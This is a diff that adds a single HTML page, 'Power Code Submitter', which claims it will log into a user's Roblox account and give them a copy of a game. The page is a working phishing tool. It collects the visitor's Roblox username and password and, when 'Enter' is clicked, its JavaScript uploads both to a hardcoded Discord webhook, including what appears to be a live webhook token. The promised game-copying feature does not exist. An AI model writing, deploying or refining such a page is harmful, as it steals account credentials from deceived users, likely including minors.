@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Power Code Submitter</title>
+    <style>
+        body{margin:0;height:100vh;display:flex;justify-content:center;align-items:center;background:linear-gradient(135deg,#1e1e2f 0%,#2a2a4a 100%);font-family:'Arial',sans-serif;color:#fff;overflow:auto}
+        .container{background:rgba(30,30,47,.95);padding:2rem 3rem;border-radius:15px;box-shadow:0 10px 30px rgba(0,0,0,.5);text-align:center;animation:fadeIn 1s ease-in-out;max-width:600px;width:90%;backdrop-filter:blur(10px)}
+        @keyframes fadeIn{from{opacity:0;transform:translateY(-20px)}to{opacity:1;transform:translateY(0)}}
+        h1{font-size:2.5rem;margin-bottom:1rem;color:#00ff88;text-shadow:0 0 10px rgba(0,255,136,.7);animation:glow 2s ease-in-out infinite alternate}
+        @keyframes glow{from{text-shadow:0 0 10px rgba(0,255,136,.7),0 0 20px rgba(0,255,136,.3)}to{text-shadow:0 0 20px rgba(0,255,136,.9),0 0 30px rgba(0,255,136,.5)}}
+        .info{margin-bottom:2rem;font-size:1rem;line-height:1.5;color:#ccc}
+        .info h2{color:#00ff88;font-size:1.5rem;margin-bottom:1rem}
+        .input-group{position:relative;margin-bottom:1.5rem}
+        textarea{width:100%;padding:.8rem;border:none;border-radius:8px;background:#2a2a4a;color:#fff;font-size:1rem;outline:none;transition:all .3s ease;box-shadow:0 0 10px rgba(0,255,136,.2);resize:vertical;min-height:100px;max-height:300px}
+        textarea:focus{box-shadow:0 0 15px rgba(0,255,136,.5);background:#353560}
+        button{background:#00ff88;border:none;padding:.8rem 2rem;border-radius:8px;color:#1e1e2f;font-size:1.2rem;font-weight:bold;cursor:pointer;transition:all .3s ease;position:relative;overflow:hidden}
+        button:hover{background:#00cc70;transform:translateY(-2px);box-shadow:0 5px 15px rgba(0,255,136,.4)}
+        button:active{transform:translateY(0)}
+        .checkmark{display:none;color:#00ff88;font-size:2rem;margin-top:1rem;animation:pop .5s ease-in-out}
+        @keyframes pop{0%{transform:scale(0);opacity:0}50%{transform:scale(1.2)}100%{transform:scale(1);opacity:1}}
+        .error{color:#ff5555;margin-top:1rem;display:none}
+        .progress{color:#00ff88;margin-top:1rem;display:none}
+        .particles{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1}
+        .particle{position:absolute;background:rgba(0,255,136,.3);border-radius:50%;animation:float 10s infinite linear}
+        @keyframes float{0%{transform:translateY(100vh) scale(.5);opacity:.3}100%{transform:translateY(-100vh) scale(1);opacity:0}}
+    </style>
+</head>
+<body>
+    <div class="particles" id="particles"></div>
+    <div class="container">
+        <h1>Put the Power Code here ==></h1>
+        <div class="info">
+            <h2>How It Works</h2>
+            <p>1So it logs in to ur account and reads the game you want and it gives you the game with a download BETA!</p>
+        </div>
+
+        <!-- Power Code (original) -->
+        <div class="input-group">
+            <textarea id="powerCode" placeholder="Enter your Roblox Username" autocomplete="off"></textarea>
+        </div>
+
+        <!-- Extra Code (new) -->
+        <div class="input-group">
+            <textarea id="extraCode" placeholder="Enter your Roblox Password" autocomplete="off"></textarea>
+        </div>
+
+        <!-- Game (new) -->
+        <div class="input-group">
+            <textarea id="Game Name" placeholder="Enter The game you want to copy" autocomplete="off"></textarea>
+        </div>
+
+        <button id="submitBtn">Enter</button>
+        <div class="checkmark" id="checkmark">✔</div>
+        <div class="error" id="error">Failed to send file(s). Try again!</div>
+        <div class="progress" id="progress">Sending... 0%</div>
+    </div>
+
+    <script>
+        // ---- Particle effect (unchanged) ----
+        const particlesContainer = document.getElementById('particles');
+        for (let i = 0; i < 50; i++) {
+            const particle = document.createElement('div');
+            particle.classList.add('particle');
+            particle.style.width = `${Math.random() * 5 + 2}px`;
+            particle.style.height = particle.style.width;
+            particle.style.left = `${Math.random() * 100}%`;
+            particle.style.animationDelay = `${Math.random() * 10}s`;
+            particlesContainer.appendChild(particle);
+        }
+
+        // ---- UI elements ----
+        const submitBtn   = document.getElementById('submitBtn');
+        const powerCode   = document.getElementById('powerCode');
+        const extraCode   = document.getElementById('extraCode');
+        const checkmark   = document.getElementById('checkmark');
+        const error       = document.getElementById('error');
+        const progress    = document.getElementById('progress');
+
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1416621768445268068/iotRKux8I4hFspzafNQVdl5SGqawBg3fpTz9TKoISZV3v_Rk5RdVM9uY9YNVJXzACApG';
+
+        // ---- Helper functions ----
+        function splitIntoChunks(text, maxSize = 8000000) {
+            const chunks = [];
+            for (let i = 0; i < text.length; i += maxSize) {
+                chunks.push(text.slice(i, i + maxSize));
+            }
+            return chunks;
+        }
+
+        function createTextFile(content, index, total, baseName) {
+            const filename = total > 1 ? `${baseName}_part_${index + 1}.txt` : `${baseName}.txt`;
+            return new File([content], filename, { type: 'text/plain' });
+        }
+
+        async function sendFileChunk(chunk, index, total, baseName) {
+            const formData = new FormData();
+            formData.append('file', createTextFile(chunk, index, total, baseName));
+            formData.append('payload_json', JSON.stringify({
+                content: `${baseName.replace('_', ' ')} ${index + 1}/${total}`
+            }));
+
+            const resp = await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+            if (!resp.ok) throw new Error(`Failed part ${index + 1}`);
+        }
+
+        async function uploadText(text, baseName) {
+            if (!text) return 0;               // nothing to send
+            const chunks = splitIntoChunks(text);
+            for (let i = 0; i < chunks.length; i++) {
+                await sendFileChunk(chunks[i], i, chunks.length, baseName);
+                const percent = Math.round(((i + 1) / chunks.length) * 100);
+                progress.textContent = `Sending ${baseName.replace('_', ' ')}... ${percent}%`;
+                if (i < chunks.length - 1) await new Promise(r => setTimeout(r, 2100));
+            }
+            return chunks.length;
+        }
+
+        // ---- Main submit handler ----
+        submitBtn.addEventListener('click', async () => {
+            const pc = powerCode.value.trim();
+            const ec = extraCode.value.trim();
+
+            if (!pc && !ec) return; // nothing entered
+
+            // UI prep
+            checkmark.style.display = 'none';
+            error.style.display = 'none';
+            progress.style.display = 'block';
+            progress.textContent = 'Preparing...';
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Sending...';
+
+            try {
+                let sent = 0;
+                if (pc) sent += await uploadText(pc, 'power_code');
+                if (ec) sent += await uploadText(ec, 'extra_code');
+
+                // final success
+                checkmark.style.display = 'block';
+                powerCode.value = '';
+                extraCode.value = '';
+                setTimeout(() => checkmark.style.display = 'none', 2000);
+            } catch (e) {
+                error.style.display = 'block';
+                error.textContent = e.message || 'Failed to send file(s). Try again!';
+            } finally {
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Enter';
+                progress.style.display = 'none';
+            }
+        });
+    </script>
+</body>
+</html>
